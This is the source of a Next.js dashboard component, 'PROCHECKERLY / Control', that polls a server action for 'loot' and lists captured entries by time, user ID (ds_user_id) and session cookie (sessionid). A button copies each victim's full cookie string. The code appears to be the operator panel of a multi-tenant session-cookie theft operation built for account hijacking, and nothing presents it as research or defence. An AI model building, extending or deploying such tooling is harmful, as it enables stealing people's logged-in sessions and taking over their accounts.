"use client";
import { useEffect, useState, useCallback } from "react";
import { createBrowserClient } from "@supabase/ssr";
import { motion, AnimatePresence } from "framer-motion";
import { CopyButton } from "@/components/CopyButton";
import { PurgeButton } from "@/components/PurgeButton";

// Import the server action we created to bypass CORS
import { getRemoteLoot } from "./actions";

export default function AdminDashboard() {
  const [loot, setLoot] = useState<any[]>([]);
  const [profile, setProfile] = useState<any>(null);

  const supabase = createBrowserClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
  );

  // Memoize fetchData to prevent unnecessary re-renders
  const fetchData = useCallback(async () => {
    try {
      let currentTenant = profile?.tenant_id;

      // 1. Get user and profile if not already loaded
      if (!currentTenant) {
        const {
          data: { user },
        } = await supabase.auth.getUser();
        if (!user) return;

        const { data: profileData } = await supabase
          .from("profiles")
          .select("tenant_id")
          .single();

        if (profileData) {
          setProfile(profileData);
          currentTenant = profileData.tenant_id;
        }
      }

      // 2. Fetch data via Server Action (Bypasses Browser CORS)
      if (currentTenant) {
        const data = await getRemoteLoot(currentTenant);
        setLoot(Array.isArray(data) ? [...data].reverse() : []);
      }
    } catch (err) {
      console.error("Dashboard Sync Error:", err);
    }
  }, [profile?.tenant_id, supabase]);

  // Set up a single unified interval for polling
  useEffect(() => {
    fetchData(); // Initial load

    const interval = setInterval(() => {
      fetchData();
    }, 5000);

    return () => clearInterval(interval);
  }, [fetchData]);

  return (
    <div className="min-h-screen bg-[#050505] text-zinc-400 font-mono p-12">
      <header className="flex justify-between items-center mb-16 max-w-6xl mx-auto">
        <div>
          <h1 className="text-white text-xl font-bold tracking-tighter">
            PROCHECKERLY{" "}
            <span className="text-zinc-600 font-light">/ Control</span>
          </h1>
          <p className="text-[9px] uppercase tracking-[0.3em] text-blue-900 mt-1 font-bold">
            NODE: {profile?.tenant_id || "IDENTIFYING..."}
          </p>
        </div>
        <PurgeButton onPurge={fetchData} />
      </header>

      <main className="max-w-6xl mx-auto">
        <div className="rounded-lg border border-zinc-900 bg-zinc-900/10 shadow-sm overflow-hidden">
          <table className="w-full text-left text-xs">
            <thead className="border-b border-zinc-900 bg-zinc-900/20 text-zinc-600">
              <tr>
                <th className="px-6 py-4 font-medium uppercase tracking-widest text-[9px]">
                  Captured At
                </th>
                <th className="px-6 py-4 font-medium uppercase tracking-widest text-[9px]">
                  UID
                </th>
                <th className="px-6 py-4 font-medium uppercase tracking-widest text-[9px]">
                  Session
                </th>
                <th className="px-6 py-4 text-right"></th>
              </tr>
            </thead>
            <tbody className="divide-y divide-zinc-900/50">
              <AnimatePresence mode="popLayout">
                {loot.map((item, i) => (
                  <motion.tr
                    key={i}
                    layout
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    className="group hover:bg-white/[0.01]">
                    <td className="px-6 py-5 text-zinc-700">
                      {item.timestamp}
                    </td>
                    <td className="px-6 py-5 text-zinc-300 font-bold">
                      {item.data
                        .find((s: string) => s.includes("ds_user_id"))
                        ?.split("=")[1] || "—"}
                    </td>
                    <td className="px-6 py-5 truncate max-w-[200px] text-zinc-500">
                      {item.data.find((s: string) => s.includes("sessionid")) ||
                        "PENDING"}
                    </td>
                    <td className="px-6 py-5 text-right">
                      <CopyButton data={item.data.join("; ")} />
                    </td>
                  </motion.tr>
                ))}
              </AnimatePresence>
            </tbody>
          </table>

          {loot.length === 0 && (
            <div className="py-24 text-center text-zinc-800 text-[10px] uppercase tracking-[0.5em]">
              Waiting for data stream...
            </div>
          )}
        </div>
      </main>
    </div>
  );
}
